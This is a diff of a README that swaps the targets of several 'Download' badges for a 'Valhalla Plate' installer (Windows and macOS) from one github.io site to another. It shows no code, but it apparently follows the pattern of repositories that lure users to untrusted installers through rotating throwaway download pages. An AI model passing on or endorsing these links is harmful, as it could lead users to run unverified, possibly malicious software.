@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Valhalla+Plate-4A90D9?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![Download](https://img.shields.io/badge/⬇_Download_Valhalla+Plate-4A90D9?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -58,9 +58,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 </div>
 
@@ -106,7 +106,7 @@ This repository provides an **offline installer** for evaluation and educational
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/⬇_Download_Now-4A90D9?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![Download Now](https://img.shields.io/badge/⬇_Download_Now-4A90D9?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 <img src="https://skillicons.dev/icons?i=windows,apple,github" />
 
